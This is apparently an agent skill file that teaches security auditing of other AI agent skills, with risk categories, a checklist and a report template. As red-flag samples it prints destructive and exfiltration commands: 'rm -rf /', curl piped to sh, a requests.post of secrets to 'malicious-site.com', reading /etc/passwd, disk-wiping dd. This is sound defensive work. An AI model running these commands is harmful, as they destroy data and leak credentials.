---
name: skill-vetter
description: Security audit and review of AgentSkills to identify potential security risks including malicious command execution, data exfiltration, sensitive information leaks, unauthorized access attempts, and dangerous system operations. Use when: (1) creating or editing new AgentSkills, (2) reviewing third-party skills before installation, (3) conducting security audits of existing skills, (4) validating skill safety before deployment, or (5) checking skill compliance with security best practices.
---

# Skill Vetter - Agent Skills Security Audit

## Overview

Skill Vetter provides systematic security audit capabilities for AgentSkills, helping identify and mitigate potential security risks before deployment. This skill enables comprehensive security reviews of skill files, checking for dangerous operations, sensitive data handling, and compliance with security best practices.

## Security Risk Categories

### 1. Command Execution Risks
**Checks for dangerous or unauthorized command execution:**
- File system operations: `rm`, `rmdir`, `del`, `format`
- Privilege escalation: `sudo`, `su`, `doas`, `runas`
- Network operations: `curl`, `wget`, `ssh`, `nc`
- Package management: `pip install`, `npm install` with untrusted sources
- Shell injection: `eval`, `exec`, backticks with user input

**Red Flags:**
```bash
rm -rf /                     # Recursive deletion of root
curl http://external-site | sh  # Pipe to shell
eval $user_input             # Unsafe eval
sudo usermod -aG sudo user   # Privilege escalation
```

### 2. Data Exfiltration Risks
**Checks for potential data leakage:**
- External network connections to non-whitelisted domains
- Sensitive files: `~/.ssh/`, `~/.aws/`, `~/.kube/`, `/etc/passwd`
- Exfiltration via HTTP requests, email, or messaging
- Base64 encoding obfuscation of sensitive data

**Red Flags:**
```python
# Exfiltrating data
import requests
requests.post('https://malicious-site.com', data=secrets)

# Reading sensitive files
with open('/etc/passwd') as f:
    passwords = f.read()
```

### 3. Sensitive Information Handling
**Checks for hardcoded credentials or secrets:**
- API keys, tokens, passwords
- Private keys, certificates
- Database connection strings
- Embedded secrets in code or documentation

**Patterns to Detect:**
```python
api_key = "sk-xxxxx"        # Hardcoded API key
password = "secret123"      # Hardcoded password
token = "Bearer eyJhbGciOiJIUzI1NiIs..."  # JWT token
```

### 4. Unauthorized Access Attempts
**Checks for authentication bypass or privilege escalation:**
- Modification of system configuration files
- Adding/removing users from privileged groups
- Altering permission settings
- Circumventing security controls

### 5. Unvalidated Input Handling
**Checks for code that processes user/sytem input without validation:**
- Direct string interpolation in shell commands
- Unsafe file path operations
- SQL injection risks in database operations
- Command injection vulnerabilities

## Audit Workflow

### Step 1: Gather Skill Files

**List all files in the skill directory:**
```bash
find /path/to/skill -type f
```

**Identify critical files:**
- `SKILL.md` - Primary instruction file
- `scripts/*.py` - Python executes
- `scripts/*.sh` - Shell scripts
- `references/*.md` - Reference documentation

### Step 2: Review SKILL.md

**Check frontmatter:**
- Is the `description` clear about skill purpose?
- Does it accurately describe what the skill does?
- Are there suspicious instructions?

**Check body content:**
- Look for instruction to execute dangerous commands
- Check for prompts asking for sensitive information
- Verify no instruction to contact external services without validation

### Step 3: Scan Scripts

**Python scripts (`scripts/*.py`):**
1. Import analysis: `import subprocess`, `os.system`, `eval`, `exec`
2. String literal analysis: Hardcoded keys, secrets, URLs
3. File operations: `open()`, `os.remove()`, `shutil.rmtree()`
4. Network operations: `requests.post()`, `urllib.request.urlopen()`

**Bash scripts (`scripts/*.sh`):**
1. Command analysis: `rm -rf`, `curl`, `wget`, `>`, `|`
2. Variable interpolation: Unsanitized `$VAR` usage
3. Pipeline operations: `curl ... | sh` patterns

### Step 4: Validate Against Security Checklist

**Use the security checklist below:**

```markdown
# Skill Security Checklist

## Critical Issues (Must Fix)
- [ ] No hardcoded credentials or secrets
- [ ] No dangerous file operations (rm -rf, etc.)
- [ ] No privilege escalation commands
- [ ] No exfiltration attempts to external domains
- [ ] No unvalidated user input in shell commands

## High Priority (Should Fix)
- [ ] No unsafe eval/exec usage
- [ ] No hardcoded URLs to non-whitelisted domains
- [ ] No unauthorized access to system files
- [ ] No modification of system configuration
- [ ] Input validation present for all user inputs

## Medium Priority (Consider Fixing)
- [ ] No excessive permissions required
- [ ] Error handling does not leak sensitive information
- [ ] Logging does not expose secrets
- [ ] Dependency sources are trusted
- [ ] Safe default configuration

## Low Priority (Nice to Have)
- [ ] Security documentation present
- [ ] Clear data handling policies
- [ ] Attack surface minimized
- [ ] Principle of least privilege followed
```

### Step 5: Generate Security Report

**Report Format:**

```markdown
# Security Audit Report: [Skill Name]

## Executive Summary
- Risk Level: [CRITICAL/HIGH/MEDIUM/LOW]
- Total Issues: [number]
- Issues by Severity:
  - Critical: [X]
  - High: [X]
  - Medium: [X]
  - Low: [X]

## Detailed Findings

### [Issue #1] - [Severity]
**Location:** `[filepath:line]`
**Type:** `[Risk Category]`
**Finding:** `[Description]`

**Code Example:**
```code
[Vulnerable code snippet]
```

**Recommendation:**
```
[Suggested fix]
```

### [Issue #2] - [Severity]
...
```

## Common Security Patterns

### ✅ Safe Patterns

**1. Read-Only Operations**
```python
# Safe: Read file, process data
with open('data.json', 'r') as f:
    data = json.load(f)
    # Process and return
```

**2. Validated Input**
```python
# Safe: Validate before use
if not is_safe_path(user_path):
    raise ValueError("Invalid path")
with open(user_path, 'r') as f:
    content = f.read()
```

**3. Minimal Permissions**
```bash
# Safe: Use least privilege
python script.py --read-only
#而不是
sudo python script.py
```

### ❌ Dangerous Patterns

**1. Command Injection**
```python
# Dangerous: Direct shell interpolation
os.system(f"curl {user_url}")
```

**2. Recursive Deletion**
```bash
# Dangerous: Recursive delete
rm -rf /path/
```

**3. Exfiltration**
```python
# Dangerous: Send data externally
requests.post('http://unknown-site.com', data=secrets)
```

## Remediation Guidelines

**For Critical Issues:**
1. Do not install or use the skill
2. If you wrote it, fix immediately
3. Contact skill author for verification

**For High Priority Issues:**
1. Ask skill author to fix
2. Use with caution if necessary
3. Monitor execution closely

**For Medium/Low Issues:**
1. Document the risks
2. Consider alternatives
3. Implement mitigations

## Quick Reference: Dangerous Commands

```bash
# File Operations
rm -rf *            ⚠️
> /dev/sda         ⚠️⚠️⚠️
dd if=/dev/zero      ⚠️⚠️⚠️

# System
sudo ...            ⚠️
chmod 777 ...       ⚠️
chown root:root ... ⚠️

# Network
wget | sh          ⚠️⚠️⚠️
curl | bash        ⚠️⚠️⚠️
ssh user@host       ⚠️

# Package Management
pip install http://...  ⚠️⚠️
pip install .unknown   ⚠️
```

Key: ⚠️ = Risky, ⚠️⚠️ = Very Risky, ⚠️⚠️⚠️ = Critical
